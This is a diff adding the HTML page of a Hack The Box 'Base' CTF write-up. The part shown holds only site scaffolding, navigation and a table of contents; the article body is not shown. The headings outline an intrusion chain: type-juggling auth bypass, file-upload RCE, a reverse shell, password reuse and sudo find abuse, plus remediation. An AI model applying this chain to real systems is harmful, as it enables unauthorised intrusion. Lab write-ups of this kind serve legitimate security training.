@@ -1,0 +1,2770 @@
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+  
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="HTB Base (Easy) full write-up: auth bypass, file upload RCE, password reuse and sudo misconfiguration to root">
+      
+      
+      
+        <link rel="canonical" href="https://xxdndxx.github.io/ctf-writeups/HTB/Easy/Base/">
+      
+      
+        <link rel="prev" href="../">
+      
+      
+        <link rel="next" href="../../Medium/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content=">_ CTF Write-ups">
+  <meta property="og:title" content="Base — >_ CTF Write-ups">
+  
+    <meta property="og:description" content="HTB Base (Easy) full write-up: auth bypass, file upload RCE, password reuse and sudo misconfiguration to root">
+  
+  <meta property="og:image" content="https://raw.githubusercontent.com/xXDNDXx/ctf-writeups/main/branding/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="theme-color" content="#08090d">
+
+    
+      
+        <title>Base - >_ CTF Write-ups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+  <link rel="preconnect" href="https://fonts.bunny.net" crossorigin>
+  <link rel="stylesheet" href="https://fonts.bunny.net/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap">
+  <style>
+    :root {
+      --md-text-font: 'Inter', ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+      --md-code-font: 'JetBrains Mono', ui-monospace, 'Cascadia Code', Consolas, 'Courier New', monospace;
+    }
+  </style>
+
+    
+      <link rel="stylesheet" href="../../../stylesheets/opfor.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#htb-base-full-walkthrough" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="&gt;_ CTF Write-ups" class="md-header__button md-logo" aria-label=">_ CTF Write-ups" data-md-component="logo">
+      
+  <img src="../../../logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            >_ CTF Write-ups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Base
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/xXDNDXx/ctf-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    xXDNDXx/ctf-writeups
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../methodology/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Methodology
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  HTB
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../THM/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  THM
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../contributing/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Contribute
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="&gt;_ CTF Write-ups" class="md-nav__button md-logo" aria-label=">_ CTF Write-ups" data-md-component="logo">
+      
+  <img src="../../../logo.png" alt="logo">
+
+    </a>
+    >_ CTF Write-ups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/xXDNDXx/ctf-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    xXDNDXx/ctf-writeups
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodology/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Methodology
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HTB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Easy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Base
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Base
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-machine-overview-metadata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Machine Overview &amp; Metadata
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Machine Overview &amp; Metadata">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-chain-at-a-glance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain at a Glance
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-reconnaissance-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Reconnaissance &amp; Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Reconnaissance &amp; Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-connectivity-check-variable-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Connectivity Check &amp; Variable Setup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-full-nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Full Nmap Scan
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-web-enumeration-first-look" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3 Web Enumeration — First Look
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24-directory-file-fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4 Directory &amp; File Fuzzing
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-source-code-review-vulnerability-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Source Code Review &amp; Vulnerability Discovery
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Source Code Review &amp; Vulnerability Discovery">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-recovering-the-source-from-the-swap-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.1 Recovering the Source from the Swap File
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-root-cause-strcmp-loose-comparison-type-juggling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.2 Root Cause: strcmp() + Loose Comparison (Type Juggling)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-initial-foothold-user-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Initial Foothold (User Access)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Initial Foothold (User Access)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-crafting-the-authentication-bypass-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 Crafting the Authentication Bypass Request
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-from-admin-panel-to-rce-unrestricted-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 From Admin Panel to RCE — Unrestricted File Upload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-locating-the-upload-directory" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3 Locating the Upload Directory
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#44-catching-the-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.4 Catching the Shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#45-shell-upgrade-full-tty" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.5 Shell Upgrade — Full TTY
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#46-enumeration-as-www-data-credential-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.6 Enumeration as www-data &amp; Credential Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-privilege-escalation-root-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Privilege Escalation (Root Access)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Privilege Escalation (Root Access)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-systematic-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 Systematic Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-the-vector-sudo-on-usrbinfind" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 The Vector: sudo on /usr/bin/find
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#53-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.3 Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-remediation-security-hardening" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Remediation &amp; Security Hardening
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Remediation &amp; Security Hardening">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-sensitive-file-exposure-loginphpswp-directory-listing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.1 Sensitive File Exposure (login.php.swp, directory listing)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62-authentication-bypass-php-type-juggling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.2 Authentication Bypass (PHP type juggling)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63-unrestricted-file-upload-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.3 Unrestricted File Upload → RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#64-credential-storage-reuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.4 Credential Storage &amp; Reuse
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#65-dangerous-sudo-rule" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.5 Dangerous sudo Rule
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#66-defense-in-depth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.6 Defense-in-Depth
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-lessons-learned-attack-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Lessons Learned (Attack Summary)
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Medium/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Medium
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Hard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insane/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insane
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../THM/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    THM
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    THM
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../THM/Easy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../THM/Medium/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Medium
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Medium
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../THM/Medium/Support/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Support
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../THM/Hard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
